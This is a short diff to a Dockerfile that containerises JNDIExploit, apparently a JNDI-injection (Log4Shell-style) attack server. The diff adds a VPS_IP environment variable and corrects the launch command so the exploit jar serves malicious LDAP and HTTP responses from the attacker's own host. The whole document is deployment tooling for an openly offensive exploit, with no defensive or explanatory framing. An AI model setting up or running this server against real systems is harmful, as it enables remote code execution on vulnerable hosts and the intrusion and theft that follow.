@@ -16,6 +16,7 @@ RUN set -ex \
 
 ENV LDAP_PORT=1389
 ENV HTTP_PORT=80
+ENV VPS_IP=0.0.0.0
 
 WORKDIR /jndiexploit
-CMD ["sh","-c","java -jar /jndiexploit/JNDIExploit-1.2-SNAPSHOT.jar --ip VPS_IP --ldapPort \"${LDAP_PORT}\" --httpPort \"${HTTP_PORT}\""]
+CMD ["sh","-c","java -jar /jndiexploit/JNDIExploit-1.2-SNAPSHOT.jar --ip \"${VPS_IP}\" --ldapPort \"${LDAP_PORT}\" --httpPort \"${HTTP_PORT}\""]
